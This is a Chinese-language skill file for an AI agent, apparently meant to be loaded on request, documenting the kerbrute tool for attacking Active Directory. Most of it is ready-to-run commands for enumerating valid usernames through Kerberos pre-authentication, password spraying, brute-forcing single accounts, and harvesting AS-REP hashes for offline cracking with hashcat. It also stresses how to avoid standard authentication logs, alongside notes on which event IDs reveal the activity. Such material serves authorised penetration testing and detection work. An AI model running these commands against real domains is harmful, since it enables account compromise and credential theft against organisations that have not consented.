---
name: kerbrute
description: >
  此技能适用于用户询问关于"kerbrute"、"通过 Kerberos 预认证枚举有效 AD 用户名"、"对 AD 执行密码喷洒"、"暴力破解特定用户密码"、"在不触发标准认证日志的情况下识别有效账号"。基于 Kerberos 的 Active Directory 用户枚举和密码喷洒工具。
---

# Kerbrute

快速 Kerberos 用户枚举和密码喷洒 — 利用 Kerberos 预认证错误实现隐蔽枚举。

## 快速开始

```bash
# 枚举有效用户
kerbrute userenum -d domain.local --dc dc.domain.local users.txt

# 密码喷洒
kerbrute passwordspray -d domain.local --dc dc.domain.local users.txt "Password123"

# 暴力破解单个用户
kerbrute bruteuser -d domain.local --dc dc.domain.local passwords.txt john.doe
```

## 子命令

| 命令 | 说明 |
|------|------|
| `userenum` | 通过 Kerberos 预认证枚举有效用户名 |
| `passwordspray` | 对多个用户喷洒单个密码 |
| `bruteuser` | 暴力破解单个用户的密码 |
| `bruteforce` | 从文件中暴力破解 user\:password 对 |

## 核心参数

| 参数 | 说明 |
|------|------|
| `-d <domain>` | 目标域（如 `domain.local`） |
| `--dc <dc>` | 域控制器 IP 或主机名 |
| `-t <n>` | 线程数（默认 10） |
| `-o <file>` | 将有效账号输出到文件 |
| `--hash-file <file>` | 将找到的哈希输出到文件（AS-REP roasting） |
| `--downgrade` | 强制使用 RC4（较弱）加密 |
| `-v` | 详细输出 |
| `--safe` | 锁定保护（每个用户失败 3 次后停止） |
| `--delay <ms>` | 请求间延迟（毫秒） |

## 常用工作流

```bash
# 从用户名列表枚举用户
kerbrute userenum -d corp.local --dc 10.10.10.1 usernames.txt -o valid_users.txt -v

# 先生成用户名（如 john.doe、jdoe、johnd 等）

# 安全密码喷洒（避免锁定）
kerbrute passwordspray -d corp.local --dc 10.10.10.1 valid_users.txt "Spring2024!" \
  --safe --delay 1000

# 获取未启用预认证用户的 AS-REP 哈希（随后离线破解）
kerbrute userenum -d corp.local --dc 10.10.10.1 users.txt --hash-file asrep_hashes.txt
# 使用 hashcat 破解：hashcat -a 0 -m 18200 asrep_hashes.txt rockyou.txt

# 组合喷洒 + 提取
kerbrute bruteforce -d corp.local --dc 10.10.10.1 user_pass_pairs.txt
```

## 检测说明

Kerbrute 对无效用户产生 **KDC_ERR_C_PRINCIPAL_UNKNOWN** 错误（不生成事件 4768）。有效用户命中时产生 **KDC_ERR_PREAUTH_FAILED**（记录为 4771）。比 LDAP 枚举隐蔽得多。

## 参考资源

| 文件 | 加载时机 |
|------|----------|
| `references/attacks.md` | Kerberos 攻击链（AS-REP roasting、Kerberoasting）、用户名生成、检测规避 |
